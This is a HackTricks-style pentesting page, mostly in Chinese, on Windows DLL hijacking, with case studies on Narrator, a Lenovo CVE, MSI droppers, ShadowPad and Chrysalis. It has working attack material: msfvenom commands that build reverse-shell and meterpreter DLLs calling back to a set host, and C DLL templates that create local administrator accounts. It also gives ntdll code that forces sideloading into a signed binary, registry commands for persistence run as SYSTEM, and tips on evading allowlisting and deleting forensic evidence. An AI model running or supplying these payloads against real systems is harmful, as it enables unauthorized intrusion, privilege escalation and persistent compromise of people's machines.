# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本信息

DLL Hijacking 涉及操纵受信任的应用程序去加载恶意 DLL。该术语涵盖若干策略，如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于 code execution、实现 persistence，以及较少用于 privilege escalation。尽管这里侧重于 escalation，但劫持方法在不同目标之间是一致的。

### 常见技术

针对 DLL hijacking 有若干方法可用，其有效性取决于应用的 DLL 加载策略：

1. **DLL Replacement**：将真实 DLL 替换为恶意 DLL，可选择使用 DLL Proxying 来保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放在搜索路径中，位于合法 DLL 之前，利用应用的搜索顺序。
3. **Phantom DLL Hijacking**：为应用创建一个恶意 DLL，使其误以为这是所需但不存在的 DLL 并加载它。
4. **DLL Redirection**：修改如 `%PATH%` 或 `.exe.manifest` / `.exe.local` 文件等搜索参数，以指向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法通常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在与复制的应用同目录的用户可控目录中，类似于 Binary Proxy Execution 技术。

> [!TIP]
> 想要一个将 HTML staging、AES-CTR 配置和 .NET implant 层叠在 DLL sideloading 之上的逐步链，请查看下面的工作流。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 查找缺失的 Dlls

在系统中查找缺失 Dlls 最常见的方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)（来自 sysinternals），并**设置**以下**两个过滤器**：

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

并仅显示 **文件系统活动（File System Activity）**：

![](<../../../images/image (153).png>)

如果你要查找**一般的缺失 dlls**，让它运行几**秒**。\
如果你要在特定可执行文件中查找**缺失 dll**，应设置另一个过滤器，例如 "Process Name" "contains" `<exec name>`，执行它，然后停止捕获事件。

## 利用缺失的 Dlls

为了提升权限，我们最好的机会是能够在某些将被搜索的位置中**写入一个特权进程会尝试加载的 dll**。因此，我们可以在一个**文件夹**中写入 dll，使得该文件夹在搜索顺序中位于原始 dll 所在文件夹之前（特殊情况），或者我们可以在某个会被搜索的文件夹中写入 dll，而原始 **dll** 在任何文件夹中都不存在。

### Dll Search Order

**在** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中可以找到 DLL 是如何被具体加载的。**

Windows 应用按一组预定义的搜索路径并按特定顺序查找 DLL。当恶意 DLL 被策略性地放置在这些目录之一并在合法 DLL 之前被加载时，就会发生 DLL hijacking。防止此类问题的一个方法是确保应用在引用所需 DLL 时使用绝对路径。

下面展示了 32 位系统上的 DLL 搜索顺序：

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

上述是在启用 SafeDllSearchMode 时的默认搜索顺序。当其被禁用时，当前目录的优先级会上升到第二位。要禁用此功能，请创建注册表值 HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode 并将其设置为 0（默认启用）。

如果以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数，则搜索将从正在被 LoadLibraryEx 加载的可执行模块的目录开始。

最后注意，dll 也可以通过指定绝对路径而不是仅使用名称来加载。在这种情况下，该 dll 只会在该路径中被搜索（如果该 dll 有任何依赖项，则这些依赖项将按名称进行搜索，就像按名称加载的一样）。

还有其他方法可以改变搜索顺序，但这里不再详述。

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

一种更高级且确定性的方法是在使用 ntdll 的本地 API 创建进程时，在 RTL_USER_PROCESS_PARAMETERS 中设置 DllPath 字段来影响新创建进程的 DLL 搜索路径。通过在此处提供攻击者可控的目录，当目标进程按名称解析导入的 DLL（非绝对路径且未使用安全加载标志）时，可以被强制从该目录加载恶意 DLL。

关键思想
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供指向你可控文件夹（例如你的 dropper/unpacker 所在目录）的自定义 DllPath。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器将咨询所提供的 DllPath，从而在恶意 DLL 未与目标 EXE 同目录时也能可靠地实现 sideloading。

注意/限制
- 这只影响被创建的子进程；它不同于 SetDllDirectory（后者只影响当前进程）。
- 目标必须以名称导入或通过 LoadLibrary 加载 DLL（不能是绝对路径，且不要使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径不能被劫持。Forwarded exports 和 SxS 可能改变优先级。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

操作示例
- 将恶意 xmllite.dll（导出所需函数或代理真实的那个）放在你的 DllPath 目录中。
- 启动一个已签名且已知会按名称查找 xmllite.dll 的二进制，使用上述技术。加载器通过提供的 DllPath 解析导入并 sideloads 你的 DLL。

该技术已在实战中被观察到用于驱动多阶段 sideloading 链：初始 launcher 放置一个辅助 DLL，随后该辅助 DLL 生成一个 Microsoft-signed、可被 hijack 的二进制并使用自定义 DllPath，以强制从 staging directory 加载攻击者的 DLL。


#### Exceptions on dll search order from Windows docs

Windows 文档中指出了对标准 DLL 搜索顺序的某些例外情况：

- 当遇到一个 **与内存中已加载的 DLL 同名的 DLL** 时，系统会绕过常规的搜索。相反，它会在默认使用内存中已加载的 DLL 之前检查重定向和 manifest。**在这种情况下，系统不会对该 DLL 进行搜索**。
- 如果该 DLL 被识别为当前 Windows 版本的 **known DLL**，系统将使用其版本的该 known DLL 以及任何依赖的 DLL，**放弃搜索过程**。注册表键 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果一个 **DLL 有依赖项**，对这些依赖 DLL 的搜索会按它们仅由 **module names** 指示的方式进行，无论初始 DLL 是否通过完整路径被标识。

### Escalating Privileges

**Requirements**:

- 确定一个以或将以 **不同权限**（横向或侧向移动）运行的进程，该进程 **缺少某个 DLL**。
- 确保在将要 **搜索 DLL** 的任意 **目录** 上具有 **写访问权限**。该位置可能是可执行文件的目录或系统路径中的某个目录。

是的，要满足这些前置条件很难，因为**默认情况下要找到一个缺少 DLL 的特权可执行文件比较罕见**，并且在系统路径文件夹上**拥有写权限更为罕见**（默认情况下你没有）。但在配置错误的环境中这是可能的。\
如果你足够幸运并满足这些条件，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即使该项目的**主要目标是 bypass UAC**，你也可能在那里找到适用于目标 Windows 版本的 Dll hijaking 的 **PoC**（可能只需更改你有写权限的文件夹路径）。

注意，你可以通过以下方式 **检查你在某个文件夹的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并且 **检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
您也可以检查 executable 的 imports 和 dll 的 exports：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
要获取有关如何在有权限写入 **System Path folder** 的情况下 **滥用 Dll Hijacking 来提权** 的完整指南，请查看：


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) 会检查你是否对 system PATH 内的任何文件夹拥有写权限。\
其他用于发现此漏洞的有趣自动化工具包括 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果你发现可利用的情形，成功利用它的最重要事项之一是**创建一个至少导出该可执行文件将从中导入的所有函数的 dll**。另外，注意 Dll Hijacking 在进行 [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) 或从 [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system) 时非常有用。你可以在这个针对执行的 dll hijacking 研究中找到一个 **如何创建有效 dll** 的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
此外，在下一节中你可以找到一些可能有用的 **基础 dll 代码**，可作为 **模板** 或用于创建导出非必需函数的 **dll**。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本上，一个 **Dll proxy** 是一个 Dll，能够在被加载时**执行你的恶意代码**，同时也能通过将所有调用转发到真实库来**对外暴露并按预期工作**。

使用工具 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你可以实际**指定一个可执行文件并选择要 proxify 的库**并**生成一个 proxified dll**，或者**指定该 Dll 并生成一个 proxified dll**。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建用户 (x86 我没看到 x64 版本):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

请注意，在多种情况下你编译的 Dll 必须 **导出多个函数**，这些函数会被受害进程加载；如果这些函数不存在，**binary 将无法加载** 它们，且 **exploit 将失败**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL 示例（包含用户创建）</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>带线程入口的替代 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## 案例研究：Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows 的 Narrator.exe 在启动时仍会探测一个可预测的、与语言相关的本地化 DLL，该 DLL 可被劫持以实现 arbitrary code execution 和 persistence。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- 过滤器：`Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- 启动 Narrator 并观察对上述路径的加载尝试。

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻击流程

1. 作为标准用户，将 `hostfxr.dll` 放到 `C:\ProgramData\Lenovo\TPQM\Assistant\`。
2. 等待计划任务在当前用户上下文于 9:30 AM 运行。
3. 如果任务执行时有管理员已登录，恶意 DLL 会在管理员会话中以 medium integrity 运行。
4. 链式使用标准 UAC bypass 技术，将权限从 medium integrity 提升到 SYSTEM 特权。

## 案例研究: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

威胁行为者经常将 MSI-based droppers 与 DLL side-loading 配对，以在受信任的已签名进程下执行 payload。

Chain overview
- 用户下载 MSI。一个 CustomAction 会在 GUI 安装期间静默运行（例如 LaunchApplication 或 VBScript action），从嵌入的资源重构下一阶段。
- dropper 将合法的已签名 EXE 和恶意 DLL 写入同一目录（示例对：Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 当已签名的 EXE 启动时，Windows DLL search order 会优先从 working directory 加载 wsc.dll，从而在已签名的父进程下执行攻击者代码（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction 表：
- 查找运行可执行文件或 VBScript 的条目。可疑示例模式：LaunchApplication 在后台执行嵌入文件。
- 在 Orca (Microsoft Orca.exe) 中，检查 CustomAction、InstallExecuteSequence 和 Binary 表。
- MSI CAB 中的嵌入/分割 payload：
- 管理员提取： msiexec /a package.msi /qb TARGETDIR=C:\out
- 或者使用 lessmsi： lessmsi x package.msi C:\out
- 查找多个小片段，这些片段会被 VBScript CustomAction 连接并解密。常见流程：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
使用 wsc_proxy.exe 的实战 sideloading
- 将这两个文件放到同一文件夹中：
- wsc_proxy.exe: 合法签名的宿主（Avast）。该进程会尝试从其目录按名称加载 wsc.dll。
- wsc.dll: attacker DLL。如果不需要特定导出，DllMain 就足够；否则，构建一个 proxy DLL，并在运行 payload 的同时将所需导出转发到真实库。
- 构建最小化的 DLL payload：
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- 对于导出需求，使用一个代理框架（例如 DLLirant/Spartacus）来生成一个转发 DLL，同时执行你的 payload。

- 该技术依赖宿主二进制对 DLL 名称的解析。如果宿主使用绝对路径或安全加载标志（例如 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories），劫持可能会失败。
- KnownDLLs、SxS 和 forwarded exports 会影响优先级，选择宿主二进制和导出集合时必须考虑这些因素。

## 已签名三件组 + 加密 payloads (ShadowPad case study)

Check Point 描述了 Ink Dragon 如何使用 **三文件三件组** 部署 ShadowPad，以便融入合法软件同时在磁盘上保持核心 payload 加密：

1. **已签名的宿主 EXE** – 滥用的厂商包括 AMD、Realtek 或 NVIDIA（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻击者将可执行文件重命名为看起来像 Windows 二进制（例如 `conhost.exe`），但 Authenticode 签名仍然有效。
2. **恶意加载器 DLL** – 放置在 EXE 旁边并使用期望的名称（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。该 DLL 通常是使用 ScatterBrain 框架混淆的 MFC 二进制；其唯一作用是定位加密的 blob、解密它，并以反射方式映射 ShadowPad。
3. **加密 payload blob** – 通常以 `<name>.tmp` 存放在相同目录。内存映射解密后的 payload 后，加载器删除 TMP 文件以销毁取证证据。

Tradecraft notes:

* 重命名已签名的 EXE（同时在 PE 头中保留原始的 `OriginalFileName`）可以让它伪装成 Windows 二进制但保留厂商签名，因此复制 Ink Dragon 将实际上是 AMD/NVIDIA 实用程序但看起来像 `conhost.exe` 的二进制放置的做法。
* 由于可执行文件保持受信任，大多数 allowlisting 控制只需你的恶意 DLL 与其并置。专注于定制加载器 DLL；已签名的父进程通常可以不做修改直接运行。
* ShadowPad 的解密器期望 TMP blob 与加载器位于同一目录并可写，以便在映射后清零该文件。在 payload 加载之前保持该目录可写；一旦载入内存，TMP 文件即可出于 OPSEC 而安全删除。

## 案例研究：NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近的 Lotus Blossom 入侵滥用受信任的更新链，投放了一个 NSIS 打包的 dropper，该 dropper 进行了 DLL sideload 并部署了完全驻内存的 payloads。

攻击流程
- `update.exe` (NSIS) 创建 `%AppData%\Bluetooth`，将其标记为 **HIDDEN**，投放一个重命名的 Bitdefender Submission Wizard `BluetoothService.exe`、一个恶意的 `log.dll`，和一个加密 blob `BluetoothService`，然后启动该 EXE。
- 宿主 EXE 导入 `log.dll` 并调用 `LogInit`/`LogWrite`。`LogInit` mmap-loads 该 blob；`LogWrite` 使用自定义基于 LCG 的流（常数 **0x19660D** / **0x3C6EF35F**，密钥材料从先前的散列派生）对其解密，覆盖缓冲区为明文 shellcode，释放临时数据，然后跳转执行。
- 为避免使用 IAT，加载器通过对导出名进行哈希来解析 API，使用 **FNV-1a basis 0x811C9DC5 + prime 0x1000193**，然后应用 Murmur 风格的 avalanche（**0x85EBCA6B**）并与加盐的目标哈希比较。

主要 shellcode (Chrysalis)
- 通过对类 PE 的主模块重复五轮 add/XOR/sub 操作并使用密钥 `gQ2JR&9;` 来解密，然后动态加载 `Kernel32.dll` → `GetProcAddress` 完成导入解析。
- 通过逐字符位旋转/XOR 变换在运行时重建 DLL 名称字符串，然后加载 `oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`。
- 使用第二解析器遍历 **PEB → InMemoryOrderModuleList**，以 4 字节块并用 Murmur 风格混合解析每个导出表，只有在未找到哈希时才回退到 `GetProcAddress`。

嵌入的配置 & C2
- 配置位于投放的 `BluetoothService` 文件内的 **offset 0x30808**（大小 **0x980**），使用密钥 `qwhvb^435h&*7` 进行 RC4 解密，揭示 C2 URL 和 User-Agent。
- Beacon 构建点分隔的主机配置文件，前置标签 `4Q`，然后在通过 HTTPS 调用 `HttpSendRequestA` 之前用密钥 `vAuig34%^325hGV` 进行 RC4 加密。响应被 RC4 解密并由标签开关分发（`4T` shell，`4V` 进程执行，`4W/4X` 文件写入，`4Y` 读取/外泄，`4\\` 卸载，`4` 驱动器/文件枚举 + 分块传输 情况）。
- 执行模式由 CLI 参数控制：无参数 = 安装持久化（service/Run 键）指向 `-i`；`-i` 以 `-k` 重新启动自身；`-k` 跳过安装并运行 payload。

观察到的替代加载器
- 同一入侵投放了 Tiny C Compiler，并从 `C:\ProgramData\USOShared\` 执行 `svchost.exe -nostdlib -run conf.c`，旁边放有 `libtcc.dll`。攻击者提供的 C 源码嵌入了 shellcode，编译后在内存中运行，未触及磁盘上的 PE。复现示例：
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 该基于 TCC 的编译并运行阶段在运行时导入了 `Wininet.dll`，并从硬编码的 URL 拉取了二阶段 shellcode，从而提供了一个伪装成编译运行的灵活 loader。

## 参考资料

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
